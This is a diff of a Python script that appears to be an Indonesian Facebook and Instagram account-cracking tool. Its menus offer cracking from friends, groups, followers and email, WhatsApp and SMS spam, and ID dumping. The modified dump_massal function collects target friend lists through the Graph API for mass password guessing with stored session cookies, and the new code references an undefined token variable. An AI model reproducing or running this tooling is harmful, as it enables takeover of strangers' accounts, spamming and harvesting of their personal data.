@@ -194,16 +194,16 @@ def clear():
 	os.system('clear')
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
-	cetak(panel(f"""[bold yellow]                 
-[bold red]                Donasi Bro Nomor Dibawah: 
-[bold red]                081388341152                                                                                                        
-             """,width=90,padding=(0,8),title=f"Banner",style=f"bold red"))
+	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
+[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
+[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
+             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
 	os.system('clear')
 	banner()
-	cetak(panel(f"[[bold cyan]01[bold green]] Login Menggunakan Cookie              [[bold cyan]03[bold green]] Crack Instagram \n[[bold cyan]02[bold green]] Menu Crack Tanpa Login                [[bold cyan]04[bold green]] Cek Hasil Crack ",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold green"))
-	bryn = input(f' >>> Pilih Menu : ')
+	cetak(panel(f"[[bold cyan]01[bold white]] Login Menggunakan Cookie              [[bold cyan]03[bold white]] Crack Instagram \n[[bold cyan]02[bold white]] Menu Crack Tanpa Login                [[bold cyan]04[bold white]] Cek Hasil Crack ",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
+	bryn = input(f' [+] Pilih Menu : ')
 	if bryn in ['1','01']:
 		login_lagi334()
 	elif bryn in ['2','02']:
@@ -288,7 +288,7 @@ def login_lagi334():
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
 							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
-							print("\n [+] Login Berhasil/Cookies Anda Valid | python BrayennnFB.py");followdong()
+							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
 			except Exception as e:
 				print(" [+] Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -333,8 +333,8 @@ def menu(my_name,my_id):
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.4[/][/] ',width=43,padding=(0,3),style=f"bold white"))
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
 	console.print(Columns(dia))
-	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall , BrayennnXD",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
-	cetak(panel(f"[bold green][[bold cyan]01[bold green]] Crack Dari Pertemanan[rusak]     [green][[bold cyan]06[bold green]] Crack Dari Nama[bold green]      [[bold cyan]11[bold green]] Get Headers      \n[bold green][[bold cyan]02[bold green]] Crack Publik      [bold green][[bold cyan]07[bold green]] Crack Dari Pengikut     [[bold cyan]12[bold green]] Spam WhatsApp      \n[bold green][[bold cyan]03[bold green]] Crack Dari Grup      [[bold cyan]08[bold green]] Crack Dari Komentar       [bold green][[bold cyan]13[bold green]] Spam Sms \n[bold green][[bold cyan]04[bold green]] Crack Dari Email       [bold green][[bold cyan]09[bold green]] Check Opsi Checkpoint [bold green]   [[bold cyan]14[bold green]] Dump Id \n[bold green][[bold cyan]05[bold green]] Crack Dari File       [bold green][[bold cyan]10[bold green]] [bold green]Check Result Crack [bold green]      [[bold cyan]15[bold green]] [bold red]Hapus Cookies",width=90,title=f"[bold green]List Menu",style=f"bold yellow"))
+	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
+	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
 	if _____brayennn___xd____ in ['1','01']:
 		brayen_dump()
@@ -758,20 +758,51 @@ def brayen_dump():
 		exit()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
-	token = open('.token.txt','r').read()
+	try:
+		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
-		a = input(' 🤙masukan id target: ')
+	except IOError:
+		exit()
+	try:
+		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		jum = int(input(f' [+] Mau Berapa Idz Target  : '))
+	except ValueError:
+		print(' [+] Wrong input ')
+		exit()
+	if jum<1 or jum>80:
+		print(f' [+] Pertemanan Tidak Publik  ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f' [+] Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
 		try:
-			params = {
-			"access_token": token, 
-			"fields": "name,friends.fields(id,name,birthday)"
-			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			print('>> Total Idz : {}'.format(len(id)));setting()
-		except Exception as e:
-			print(e)
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print(' [+] Unstable Signal ')
+			exit()
+	try:
+		print(f' [+] Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'')
+		print(' [+] Unstable Signal ')
+		exit()
+	except (KeyError,IOError):
+		print(f' [+] Pertemanan Tidak Public ')
+		time.sleep(3)
+		exit()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
@@ -929,7 +960,7 @@ def passwrd():
 				else:
 					pool.submit(validate1,idf,pwv)
 		print('')
-	print(f'  Crack Telah Selesai,Semoga Hari Anda Menyenangkan')
+	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
 	print(f'  [+] OK : {H}{ok} ')
 	print(f'  [+] CP : {K}{cp} ')
 
